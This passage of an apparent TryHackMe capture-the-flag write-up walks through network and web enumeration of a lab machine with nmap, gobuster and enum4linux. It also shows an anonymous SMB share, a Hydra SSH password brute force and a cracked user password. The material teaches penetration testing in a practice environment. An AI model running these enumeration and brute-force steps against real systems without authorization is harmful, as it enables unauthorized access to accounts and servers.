</span><span style=color:#75715e></span>Nmap done<span style=color:#f92672>:</span> <span style=color:#ae81ff>1</span> IP <span style=color:#a6e22e>address</span> <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned <span style=color:#66d9ef>in</span> <span style=color:#ae81ff>26.03</span> seconds
           Raw packets sent<span style=color:#f92672>:</span> <span style=color:#ae81ff>1207</span> <span style=color:#f92672>(</span><span style=color:#ae81ff>53.108</span>KB<span style=color:#f92672>)</span> <span style=color:#f92672>|</span> Rcvd<span style=color:#f92672>:</span> <span style=color:#ae81ff>1001</span> <span style=color:#f92672>(</span><span style=color:#ae81ff>40.056</span>KB<span style=color:#f92672>)</span>
</code></pre></div><p>Alright, <strong>four ports open</strong> right off the bat, let&rsquo;s start with <code>enumeration</code> of the <code>web server</code> first!</p><h3 id=port-80-http>Port 80 (HTTP)<a hidden class=anchor aria-hidden=true href=#port-80-http>#</a></h3><p>Before running <code>any active scan scripts</code> against the <code>host</code>, let&rsquo;s visit the <code>host</code> üòÅ</p><p><img loading=lazy src=/images/thm-basic_pentesting/Untitled.png alt></p><p>Not much really. Let&rsquo;s proceed with gobuster after checking <code>/robots.txt</code> <em>as a norm!</em></p><p>Alright, <code>robots.txt</code> doesn&rsquo;t exist, let&rsquo;s continue with <code>gobuster</code>, I&rsquo;ll be using <code>big.txt</code> list from <code>dirb</code> for the <strong>directory enumeration</strong>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d><span style=color:#960050;background-color:#1e0010>‚îå‚îÄ‚îÄ</span><span style=color:#f92672>(</span>root<span style=color:#960050;background-color:#1e0010>üíÄ</span>b0x<span style=color:#f92672>)-[~/</span>THM<span style=color:#f92672>/</span>Basic Pentesting<span style=color:#f92672>]</span>
<span style=color:#960050;background-color:#1e0010>‚îî‚îÄ#</span> gobuster dir <span style=color:#f92672>-</span>u http<span style=color:#f92672>:</span><span style=color:#75715e>//10.10.137.134 -w /usr/share/wordlists/dirb/big.txt -k -e -b 404 -t 100                                                                                                            130 ‚®Ø
</span><span style=color:#75715e></span><span style=color:#f92672>===============================================================</span>
Gobuster v3<span style=color:#f92672>.</span><span style=color:#a6e22e>1</span><span style=color:#f92672>.</span><span style=color:#a6e22e>0</span>
by OJ <span style=color:#a6e22e>Reeves</span> <span style=color:#f92672>(</span><span style=color:#a6e22e>@TheColonial</span><span style=color:#f92672>)</span> <span style=color:#f92672>&amp;</span> Christian <span style=color:#a6e22e>Mehlmauer</span> <span style=color:#f92672>(</span><span style=color:#a6e22e>@firefart</span><span style=color:#f92672>)</span>
<span style=color:#f92672>===============================================================</span>
<span style=color:#f92672>[+]</span> Url<span style=color:#f92672>:</span>                     http<span style=color:#f92672>:</span><span style=color:#75715e>//10.10.137.134
</span><span style=color:#75715e></span><span style=color:#f92672>[+]</span> Method<span style=color:#f92672>:</span>                  GET
<span style=color:#f92672>[+]</span> Threads<span style=color:#f92672>:</span>                 <span style=color:#ae81ff>100</span>
<span style=color:#f92672>[+]</span> Wordlist<span style=color:#f92672>:</span>                <span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>share<span style=color:#f92672>/</span>wordlists<span style=color:#f92672>/</span>dirb<span style=color:#f92672>/</span>big<span style=color:#f92672>.</span><span style=color:#a6e22e>txt</span>
<span style=color:#f92672>[+]</span> Negative Status codes<span style=color:#f92672>:</span>   <span style=color:#ae81ff>404</span>
<span style=color:#f92672>[+]</span> User Agent<span style=color:#f92672>:</span>              gobuster<span style=color:#f92672>/</span><span style=color:#ae81ff>3.1</span><span style=color:#f92672>.</span><span style=color:#a6e22e>0</span>
<span style=color:#f92672>[+]</span> Expanded<span style=color:#f92672>:</span>                <span style=color:#66d9ef>true</span>
<span style=color:#f92672>[+]</span> Timeout<span style=color:#f92672>:</span>                 <span style=color:#ae81ff>10</span>s
<span style=color:#f92672>===============================================================</span>
<span style=color:#ae81ff>2021</span><span style=color:#f92672>/</span><span style=color:#ae81ff>04</span><span style=color:#f92672>/</span><span style=color:#ae81ff>11</span> <span style=color:#ae81ff>03</span><span style=color:#f92672>:</span><span style=color:#ae81ff>51</span><span style=color:#f92672>:</span><span style=color:#ae81ff>25</span> Starting gobuster <span style=color:#66d9ef>in</span> directory enumeration mode
<span style=color:#f92672>===============================================================</span>
http:<span style=color:#75715e>//10.10.137.134/.htpasswd            (Status: 403) [Size: 297]
</span><span style=color:#75715e></span>http:<span style=color:#75715e>//10.10.137.134/.htaccess            (Status: 403) [Size: 297]
</span><span style=color:#75715e></span>http:<span style=color:#75715e>//10.10.137.134/development          (Status: 301) [Size: 320] [--&gt; http://10.10.137.134/development/]
</span><span style=color:#75715e></span>http:<span style=color:#75715e>//10.10.137.134/server-status        (Status: 403) [Size: 301]                                        
</span><span style=color:#75715e></span>                                                                                                           
<span style=color:#f92672>===============================================================</span>
<span style=color:#ae81ff>2021</span><span style=color:#f92672>/</span><span style=color:#ae81ff>04</span><span style=color:#f92672>/</span><span style=color:#ae81ff>11</span> <span style=color:#ae81ff>03</span><span style=color:#f92672>:</span><span style=color:#ae81ff>52</span><span style=color:#f92672>:</span><span style=color:#ae81ff>28</span> Finished
<span style=color:#f92672>===============================================================</span>
</code></pre></div><p>Alright, there&rsquo;s a valid endpoint <code>/development</code> let&rsquo;s check it out.</p><p><a href=http://10.10.137.134/development/><code>http://10.10.137.134/development/</code></a> indicates two <code>.txt</code> files in it.</p><p><img loading=lazy src=/images/thm-basic_pentesting/Untitled%201.png alt=/images/thm-basic_pentesting/Untitled%201.png></p><p><strong>Let&rsquo;s go through the contents of these</strong>:</p><p><a href=http://10.10.137.134/development/dev.txt>http://10.10.137.134/development/dev.txt</a></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d><span style=color:#ae81ff>2018</span><span style=color:#f92672>-</span><span style=color:#ae81ff>04</span><span style=color:#f92672>-</span><span style=color:#ae81ff>23</span><span style=color:#f92672>:</span> I<span style=color:#960050;background-color:#1e0010>&#39;</span>ve been messing <span style=color:#66d9ef>with</span> that struts stuff<span style=color:#f92672>,</span> and it<span style=color:#960050;background-color:#1e0010>&#39;</span>s pretty cool<span style=color:#f92672>!</span> I think it might be neat
to host that on <span style=color:#66d9ef>this</span> server too<span style=color:#f92672>.</span> Haven<span style=color:#960050;background-color:#1e0010>&#39;</span>t made any <span style=color:#66d9ef>real</span> web apps yet<span style=color:#f92672>,</span> but I have tried that example
you get to show off how it <span style=color:#a6e22e>works</span> <span style=color:#f92672>(</span>and it<span style=color:#960050;background-color:#1e0010>&#39;</span>s the REST <span style=color:#66d9ef>version</span> of the example<span style=color:#f92672>!).</span> Oh<span style=color:#f92672>,</span> and right now I<span style=color:#960050;background-color:#1e0010>&#39;</span>m 
using <span style=color:#66d9ef>version</span> <span style=color:#ae81ff>2.5</span><span style=color:#f92672>.</span><span style=color:#a6e22e>12</span><span style=color:#f92672>,</span> because other versions were giving me trouble<span style=color:#f92672>.</span> <span style=color:#f92672>-</span>K

<span style=color:#ae81ff>2018</span><span style=color:#f92672>-</span><span style=color:#ae81ff>04</span><span style=color:#f92672>-</span><span style=color:#ae81ff>22</span><span style=color:#f92672>:</span> SMB has been configured<span style=color:#f92672>.</span> <span style=color:#f92672>-</span>K

<span style=color:#ae81ff>2018</span><span style=color:#f92672>-</span><span style=color:#ae81ff>04</span><span style=color:#f92672>-</span><span style=color:#ae81ff>21</span><span style=color:#f92672>:</span> I got Apache set up<span style=color:#f92672>.</span> Will put <span style=color:#66d9ef>in</span> our content later<span style=color:#f92672>.</span> <span style=color:#f92672>-</span>J
</code></pre></div><p><a href=http://10.10.137.134/development/j.txt>http://10.10.137.134/development/j.txt</a></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d>For J<span style=color:#f92672>:</span>

I<span style=color:#960050;background-color:#1e0010>&#39;</span>ve been auditing the contents of <span style=color:#f92672>/</span>etc<span style=color:#f92672>/</span>shadow to make sure we don<span style=color:#960050;background-color:#1e0010>&#39;</span>t have any weak credentials<span style=color:#f92672>,</span>
and I was able to crack your hash really easily<span style=color:#f92672>.</span> You know our password policy<span style=color:#f92672>,</span> so please follow
it<span style=color:#f92672>?</span> Change that password ASAP<span style=color:#f92672>.</span>

<span style=color:#f92672>-</span>K
</code></pre></div><p>Alright, we get an image of a server that is <strong>insecure</strong> and the <strong>user hash being cracked easily</strong>. Also, <em>there are two users</em> (<em>-K</em> and <em>-J</em>), need their full names or <strong>at least usernames</strong>.</p><p>For now, let&rsquo;s move back to the <strong>open ports</strong> & <strong>running services</strong> found and <code>enumerate</code> them further.</p><hr><h3 id=port-445---smb>Port 445 - SMB<a hidden class=anchor aria-hidden=true href=#port-445---smb>#</a></h3><p><strong>SMB</strong> server running on a linux machine? Let&rsquo;s run <code>enum4linux</code> ‚Äî The argument (<code>-a</code>) is for enumerating everything!</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d><span style=color:#960050;background-color:#1e0010>‚îå‚îÄ‚îÄ</span><span style=color:#f92672>(</span>root<span style=color:#960050;background-color:#1e0010>üíÄ</span>b0x<span style=color:#f92672>)-[~/</span>THM<span style=color:#f92672>/</span>Basic Pentesting<span style=color:#f92672>]</span>                                                                  
<span style=color:#960050;background-color:#1e0010>‚îî‚îÄ#</span> enum4linux <span style=color:#f92672>-</span>a <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>137</span><span style=color:#f92672>.</span><span style=color:#a6e22e>134</span>                                                                          
Starting enum4linux v0<span style=color:#f92672>.</span><span style=color:#a6e22e>8</span><span style=color:#f92672>.</span><span style=color:#a6e22e>9</span> <span style=color:#f92672>(</span> http<span style=color:#f92672>:</span><span style=color:#75715e>//labs.portcullis.co.uk/application/enum4linux/ ) on Sun Apr 11 03:54:51 2021                                                                                                    
</span><span style=color:#75715e></span>                                                                                                         
 <span style=color:#f92672>==========================</span>                                                                              
<span style=color:#f92672>|</span>    Target Information    <span style=color:#f92672>|</span>                                                                             
 <span style=color:#f92672>==========================</span>                                                                              
Target <span style=color:#f92672>...........</span> <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>137</span><span style=color:#f92672>.</span><span style=color:#a6e22e>134</span>                                                                         
RID Range <span style=color:#f92672>........</span> <span style=color:#ae81ff>500</span><span style=color:#f92672>-</span><span style=color:#ae81ff>550</span><span style=color:#f92672>,</span><span style=color:#ae81ff>1000</span><span style=color:#f92672>-</span><span style=color:#ae81ff>1050</span>                                                                     
Username <span style=color:#f92672>.........</span> <span style=color:#960050;background-color:#1e0010>&#39;&#39;</span>                                                                                    
Password <span style=color:#f92672>.........</span> <span style=color:#960050;background-color:#1e0010>&#39;&#39;</span>                                                                                    
Known Usernames <span style=color:#f92672>..</span> administrator<span style=color:#f92672>,</span> guest<span style=color:#f92672>,</span> krbtgt<span style=color:#f92672>,</span> domain admins<span style=color:#f92672>,</span> root<span style=color:#f92672>,</span> bin<span style=color:#f92672>,</span> none                          
                                                                                                         
                                                                                                         
 <span style=color:#f92672>=====================================================</span>                                                   
<span style=color:#f92672>|</span>    Enumerating Workgroup<span style=color:#f92672>/</span>Domain on <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>137</span><span style=color:#f92672>.</span><span style=color:#a6e22e>134</span>    <span style=color:#f92672>|</span>                
 <span style=color:#f92672>=====================================================</span> 
<span style=color:#f92672>[+]</span> Got domain<span style=color:#f92672>/</span>workgroup name<span style=color:#f92672>:</span> WORKGROUP

 <span style=color:#f92672>=============================================</span> 
<span style=color:#f92672>|</span>    Nbtstat Information <span style=color:#66d9ef>for</span> <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>137</span><span style=color:#f92672>.</span><span style=color:#a6e22e>134</span>    <span style=color:#f92672>|</span>
 <span style=color:#f92672>=============================================</span> 
Looking up status of <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>137</span><span style=color:#f92672>.</span><span style=color:#a6e22e>134</span>
        BASIC2          <span style=color:#f92672>&lt;</span><span style=color:#ae81ff>00</span><span style=color:#f92672>&gt;</span> <span style=color:#f92672>-</span>         B <span style=color:#f92672>&lt;</span>ACTIVE<span style=color:#f92672>&gt;</span>  Workstation Service
        BASIC2          <span style=color:#f92672>&lt;</span><span style=color:#ae81ff>03</span><span style=color:#f92672>&gt;</span> <span style=color:#f92672>-</span>         B <span style=color:#f92672>&lt;</span>ACTIVE<span style=color:#f92672>&gt;</span>  Messenger Service
        BASIC2          <span style=color:#f92672>&lt;</span><span style=color:#ae81ff>20</span><span style=color:#f92672>&gt;</span> <span style=color:#f92672>-</span>         B <span style=color:#f92672>&lt;</span>ACTIVE<span style=color:#f92672>&gt;</span>  File Server Service
        <span style=color:#f92672>..</span><span style=color:#a6e22e>__MSBROWSE__</span><span style=color:#f92672>.</span> <span style=color:#f92672>&lt;</span><span style=color:#ae81ff>01</span><span style=color:#f92672>&gt;</span> <span style=color:#f92672>-</span> <span style=color:#f92672>&lt;</span>GROUP<span style=color:#f92672>&gt;</span> B <span style=color:#f92672>&lt;</span>ACTIVE<span style=color:#f92672>&gt;</span>  Master Browser
        WORKGROUP       <span style=color:#f92672>&lt;</span><span style=color:#ae81ff>00</span><span style=color:#f92672>&gt;</span> <span style=color:#f92672>-</span> <span style=color:#f92672>&lt;</span>GROUP<span style=color:#f92672>&gt;</span> B <span style=color:#f92672>&lt;</span>ACTIVE<span style=color:#f92672>&gt;</span>  Domain<span style=color:#f92672>/</span>Workgroup Name
        WORKGROUP       <span style=color:#f92672>&lt;</span><span style=color:#ae81ff>1</span>d<span style=color:#f92672>&gt;</span> <span style=color:#f92672>-</span>         B <span style=color:#f92672>&lt;</span>ACTIVE<span style=color:#f92672>&gt;</span>  Master Browser
        WORKGROUP       <span style=color:#f92672>&lt;</span><span style=color:#ae81ff>1</span>e<span style=color:#f92672>&gt;</span> <span style=color:#f92672>-</span> <span style=color:#f92672>&lt;</span>GROUP<span style=color:#f92672>&gt;</span> B <span style=color:#f92672>&lt;</span>ACTIVE<span style=color:#f92672>&gt;</span>  Browser Service Elections

        MAC Address <span style=color:#f92672>=</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span>

 <span style=color:#f92672>======================================</span> 
<span style=color:#f92672>|</span>    Session Check on <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>137</span><span style=color:#f92672>.</span><span style=color:#a6e22e>134</span>    <span style=color:#f92672>|</span>
 <span style=color:#f92672>======================================</span> 
<span style=color:#f92672>[+]</span> Server <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>137</span><span style=color:#f92672>.</span><span style=color:#a6e22e>134</span> allows sessions using username <span style=color:#960050;background-color:#1e0010>&#39;&#39;</span><span style=color:#f92672>,</span> password <span style=color:#960050;background-color:#1e0010>&#39;&#39;</span>

 <span style=color:#f92672>============================================</span> 
<span style=color:#f92672>|</span>    Getting domain SID <span style=color:#66d9ef>for</span> <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>137</span><span style=color:#f92672>.</span><span style=color:#a6e22e>134</span>    <span style=color:#f92672>|</span>
 <span style=color:#f92672>============================================</span> 
Domain Name<span style=color:#f92672>:</span> WORKGROUP
Domain Sid<span style=color:#f92672>:</span> <span style=color:#f92672>(</span>NULL SID<span style=color:#f92672>)</span>
<span style=color:#f92672>[+]</span> Can<span style=color:#960050;background-color:#1e0010>&#39;</span>t determine <span style=color:#66d9ef>if</span> host <span style=color:#66d9ef>is</span> part of domain or part of a workgroup

 <span style=color:#f92672>=======================================</span>
 <span style=color:#f92672>|</span>    OS information on <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>137</span><span style=color:#f92672>.</span><span style=color:#a6e22e>134</span>    <span style=color:#f92672>|</span>
 <span style=color:#f92672>=======================================</span> 
Use of uninitialized value $os_info <span style=color:#66d9ef>in</span> <span style=color:#a6e22e>concatenation</span> <span style=color:#f92672>(.)</span> or <span style=color:#66d9ef>string</span> at <span style=color:#f92672>./</span>enum4linux<span style=color:#f92672>.</span><span style=color:#a6e22e>pl</span> line <span style=color:#ae81ff>464.</span>
<span style=color:#f92672>[+]</span> Got OS info <span style=color:#66d9ef>for</span> <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>137</span><span style=color:#f92672>.</span><span style=color:#a6e22e>134</span> from smbclient<span style=color:#f92672>:</span> 
<span style=color:#f92672>[+]</span> Got OS info <span style=color:#66d9ef>for</span> <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>137</span><span style=color:#f92672>.</span><span style=color:#a6e22e>134</span> from srvinfo<span style=color:#f92672>:</span>
        BASIC2         Wk Sv PrQ Unx NT SNT Samba Server <span style=color:#ae81ff>4.3</span><span style=color:#f92672>.</span><span style=color:#a6e22e>11</span><span style=color:#f92672>-</span>Ubuntu
        platform_id     <span style=color:#f92672>:</span>       <span style=color:#ae81ff>500</span>
        os <span style=color:#66d9ef>version</span>      <span style=color:#f92672>:</span>       <span style=color:#ae81ff>6.1</span>
        server type     <span style=color:#f92672>:</span>       <span style=color:#ae81ff>0x809a03</span>

 <span style=color:#f92672>==============================</span> 
<span style=color:#f92672>|</span>    Users on <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>137</span><span style=color:#f92672>.</span><span style=color:#a6e22e>134</span>    <span style=color:#f92672>|</span>
 <span style=color:#f92672>==============================</span> 
Use of uninitialized value $users <span style=color:#66d9ef>in</span> print at <span style=color:#f92672>./</span>enum4linux<span style=color:#f92672>.</span><span style=color:#a6e22e>pl</span> line <span style=color:#ae81ff>874.</span>
Use of uninitialized value $users <span style=color:#66d9ef>in</span> pattern <span style=color:#a6e22e>match</span> <span style=color:#f92672>(</span>m<span style=color:#75715e>//) at ./enum4linux.pl line 877.
</span><span style=color:#75715e></span>
Use of uninitialized value $users <span style=color:#66d9ef>in</span> print at <span style=color:#f92672>./</span>enum4linux<span style=color:#f92672>.</span><span style=color:#a6e22e>pl</span> line <span style=color:#ae81ff>888.</span>
Use of uninitialized value $users <span style=color:#66d9ef>in</span> pattern <span style=color:#a6e22e>match</span> <span style=color:#f92672>(</span>m<span style=color:#75715e>//) at ./enum4linux.pl line 890.
</span><span style=color:#75715e></span>
 <span style=color:#f92672>==========================================</span> 
<span style=color:#f92672>|</span>    Share Enumeration on <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>137</span><span style=color:#f92672>.</span><span style=color:#a6e22e>134</span>    <span style=color:#f92672>|</span>
 <span style=color:#f92672>==========================================</span> 

        Sharename       Type      Comment
        <span style=color:#f92672>---------</span>       <span style=color:#f92672>----</span>      <span style=color:#f92672>-------</span>
        Anonymous       Disk      
        IPC$            IPC       IPC <span style=color:#a6e22e>Service</span> <span style=color:#f92672>(</span>Samba Server <span style=color:#ae81ff>4.3</span><span style=color:#f92672>.</span><span style=color:#a6e22e>11</span><span style=color:#f92672>-</span>Ubuntu<span style=color:#f92672>)</span>
SMB1 disabled <span style=color:#f92672>--</span> no workgroup available

<span style=color:#f92672>[+]</span> Attempting to map shares on <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>137</span><span style=color:#f92672>.</span><span style=color:#a6e22e>134</span>
<span style=color:#75715e>//10.10.137.134/Anonymous       Mapping: OK, Listing: OK
</span><span style=color:#75715e>//10.10.137.134/IPC$    [E] Can&#39;t understand response:
</span><span style=color:#75715e></span>NT_STATUS_OBJECT_NAME_NOT_FOUND listing <span style=color:#960050;background-color:#1e0010>\</span><span style=color:#f92672>*</span>

<span style=color:#f92672>=====================================================</span> 
<span style=color:#f92672>|</span>    Password Policy Information <span style=color:#66d9ef>for</span> <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>137</span><span style=color:#f92672>.</span><span style=color:#a6e22e>134</span>    <span style=color:#f92672>|</span>
 <span style=color:#f92672>=====================================================</span> 

<span style=color:#f92672>[+]</span> Attaching to <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>137</span><span style=color:#f92672>.</span><span style=color:#a6e22e>134</span> using a NULL share

<span style=color:#f92672>[+]</span> Trying protocol <span style=color:#ae81ff>139</span><span style=color:#f92672>/</span>SMB<span style=color:#f92672>...</span>

<span style=color:#f92672>[+]</span> Found <span style=color:#a6e22e>domain</span><span style=color:#f92672>(</span>s<span style=color:#f92672>):</span>

        <span style=color:#f92672>[+]</span> BASIC2
        <span style=color:#f92672>[+]</span> Builtin

<span style=color:#f92672>[+]</span> Password Info <span style=color:#66d9ef>for</span> Domain<span style=color:#f92672>:</span> BASIC2

        <span style=color:#f92672>[+]</span> Minimum password length<span style=color:#f92672>:</span> <span style=color:#ae81ff>5</span>
        <span style=color:#f92672>[+]</span> Password history length<span style=color:#f92672>:</span> None
        <span style=color:#f92672>[+]</span> Maximum password age<span style=color:#f92672>:</span> <span style=color:#ae81ff>37</span> days <span style=color:#ae81ff>6</span> hours <span style=color:#ae81ff>21</span> minutes 
        <span style=color:#f92672>[+]</span> Password Complexity Flags<span style=color:#f92672>:</span> <span style=color:#ae81ff>000000</span>

                <span style=color:#f92672>[+]</span> Domain Refuse Password Change<span style=color:#f92672>:</span> <span style=color:#ae81ff>0</span> 
                <span style=color:#f92672>[+]</span> Domain Password Store Cleartext<span style=color:#f92672>:</span> <span style=color:#ae81ff>0</span>
                <span style=color:#f92672>[+]</span> Domain Password Lockout Admins<span style=color:#f92672>:</span> <span style=color:#ae81ff>0</span>
                <span style=color:#f92672>[+]</span> Domain Password No Clear Change<span style=color:#f92672>:</span> <span style=color:#ae81ff>0</span>
                <span style=color:#f92672>[+]</span> Domain Password No Anon Change<span style=color:#f92672>:</span> <span style=color:#ae81ff>0</span>
                <span style=color:#f92672>[+]</span> Domain Password Complex<span style=color:#f92672>:</span> <span style=color:#ae81ff>0</span>

        <span style=color:#f92672>[+]</span> Minimum password age<span style=color:#f92672>:</span> None
        <span style=color:#f92672>[+]</span> Reset Account Lockout Counter<span style=color:#f92672>:</span> <span style=color:#ae81ff>30</span> minutes 
        <span style=color:#f92672>[+]</span> Locked Account Duration<span style=color:#f92672>:</span> <span style=color:#ae81ff>30</span> minutes 
        <span style=color:#f92672>[+]</span> Account Lockout Threshold<span style=color:#f92672>:</span> None
        <span style=color:#f92672>[+]</span> Forced Log off Time<span style=color:#f92672>:</span> <span style=color:#ae81ff>37</span> days <span style=color:#ae81ff>6</span> hours <span style=color:#ae81ff>21</span> minutes
<span style=color:#f92672>...</span>
</code></pre></div><p>The output is really long so I&rsquo;ve <code>snipped</code> it, what we need is the <strong>Share Enumeration</strong> on <code>10.10.137.134</code> part.</p><p>We can see that there&rsquo;s an <code>Anonymous</code> share opened on the machine that is accessible without any credentials. Let&rsquo;s try accessing it! We can use <code>smbclient</code> for doing so.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d>smbclient <span style=color:#75715e>//10.10.137.134/Anonymous
</span></code></pre></div><p>We can press <code>ENTER</code> on password prompt since it&rsquo;s an <strong>anonymous share</strong>!</p><p><img loading=lazy src=/images/thm-basic_pentesting/Untitled%202.png alt=/images/thm-basic_pentesting/Untitled%202.png></p><p>We can see that there&rsquo;s a file in the <code>server</code>, let&rsquo;s download it by using <code>get</code></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d>smb: <span style=color:#960050;background-color:#1e0010>\</span><span style=color:#f92672>&gt;</span> get staff<span style=color:#f92672>.</span><span style=color:#a6e22e>txt</span>
getting file <span style=color:#960050;background-color:#1e0010>\</span>staff<span style=color:#f92672>.</span><span style=color:#a6e22e>txt</span> of size <span style=color:#ae81ff>173</span> as staff<span style=color:#f92672>.</span><span style=color:#a6e22e>txt</span> <span style=color:#f92672>(</span><span style=color:#ae81ff>0.2</span> KiloBytes<span style=color:#f92672>/</span>sec<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>average <span style=color:#ae81ff>0.2</span> KiloBytes<span style=color:#f92672>/</span>sec<span style=color:#f92672>)</span>
</code></pre></div><p>Let&rsquo;s go through it&rsquo;s contents:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d><span style=color:#960050;background-color:#1e0010>‚îå‚îÄ‚îÄ</span><span style=color:#f92672>(</span>root<span style=color:#960050;background-color:#1e0010>üíÄ</span>b0x<span style=color:#f92672>)-[~/</span>THM<span style=color:#f92672>/</span>Basic Pentesting<span style=color:#f92672>]</span>
<span style=color:#960050;background-color:#1e0010>‚îî‚îÄ#</span> cat staff<span style=color:#f92672>.</span><span style=color:#a6e22e>txt</span> 
Announcement to staff<span style=color:#f92672>:</span>

PLEASE <span style=color:#66d9ef>do</span> not upload non<span style=color:#f92672>-</span>work<span style=color:#f92672>-</span>related items to <span style=color:#66d9ef>this</span> share<span style=color:#f92672>.</span> I know it<span style=color:#960050;background-color:#1e0010>&#39;</span>s all <span style=color:#66d9ef>in</span> fun<span style=color:#f92672>,</span> but
<span style=color:#66d9ef>this</span> <span style=color:#66d9ef>is</span> how mistakes happen<span style=color:#f92672>.</span> <span style=color:#f92672>(</span>This means you too<span style=color:#f92672>,</span> Jan<span style=color:#f92672>!)</span>

<span style=color:#f92672>-</span>Kay
</code></pre></div><p>We get both the <strong>usernames</strong> from this <code>file</code> (i.e. <strong>Jan</strong> & <strong>Kay</strong>).</p><p><em>Note: Going through the full output of <code>enum4linux</code>, it also enumerated both names of both the users!</em></p><hr><h2 id=initial-user>Initial User<a hidden class=anchor aria-hidden=true href=#initial-user>#</a></h2><p>Since, we&rsquo;ve the <strong>users enumerated</strong>, let&rsquo;s utilize <code>hydra</code> to bruteforce <strong>SSH credentials</strong>! (I know it&rsquo;s <code>painful</code>! üò©)</p><p><img loading=lazy src=/images/thm-basic_pentesting/Untitled%203.png alt=/images/thm-basic_pentesting/Untitled%203.png></p><p>Ah well, after some time, we got the <code>valid credentials</code>. Checked into <code>rockyou.txt</code> and the word was at <code>780</code>, why would the machine author do this to innocent souls!? üòø</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d><span style=color:#960050;background-color:#1e0010>‚îå‚îÄ‚îÄ</span><span style=color:#f92672>(</span>root<span style=color:#960050;background-color:#1e0010>üíÄ</span>b0x<span style=color:#f92672>)-[~/</span>THM<span style=color:#f92672>/</span>Basic Pentesting<span style=color:#f92672>]</span>
<span style=color:#960050;background-color:#1e0010>‚îî‚îÄ#</span> grep armando <span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>share<span style=color:#f92672>/</span>wordlists<span style=color:#f92672>/</span>rockyou<span style=color:#f92672>.</span><span style=color:#a6e22e>txt</span> <span style=color:#f92672>-</span>n                                                                                                                                                         <span style=color:#ae81ff>130</span> <span style=color:#960050;background-color:#1e0010>‚®Ø</span>
780:armando            
12617:armando1           
71412:armandoteamo      
92592:josearmando
</code></pre></div><p>Got <strong>SSH</strong> access! <code>sudo -l</code> ain&rsquo;t allowed for our <code>user</code>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d><span style=color:#960050;background-color:#1e0010>‚îå‚îÄ‚îÄ</span><span style=color:#f92672>(</span>root<span style=color:#960050;background-color:#1e0010>üíÄ</span>b0x<span style=color:#f92672>)-[~/</span>THM<span style=color:#f92672>/</span>Basic Pentesting<span style=color:#f92672>]</span>                                                                                                                                                                            
<span style=color:#960050;background-color:#1e0010>‚îî‚îÄ#</span> ssh jan<span style=color:#a6e22e>@10.10.137.134</span>                                                                                                                                                                                          
The authenticity of host <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>137</span><span style=color:#f92672>.</span><span style=color:#a6e22e>134</span> <span style=color:#f92672>(</span><span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>137</span><span style=color:#f92672>.</span><span style=color:#a6e22e>134</span><span style=color:#f92672>)</span><span style=color:#960050;background-color:#1e0010>&#39;</span> can<span style=color:#960050;background-color:#1e0010>&#39;</span>t be established<span style=color:#f92672>.</span>                                                                                                                                     
ECDSA key fingerprint <span style=color:#66d9ef>is</span> SHA256<span style=color:#f92672>:+</span>Fk53V<span style=color:#f92672>/</span>LB<span style=color:#f92672>+</span><span style=color:#ae81ff>2</span>pn4OPL7GN<span style=color:#f92672>/</span>DuVHVvO0lT9N4W5ifchySQ<span style=color:#f92672>.</span>
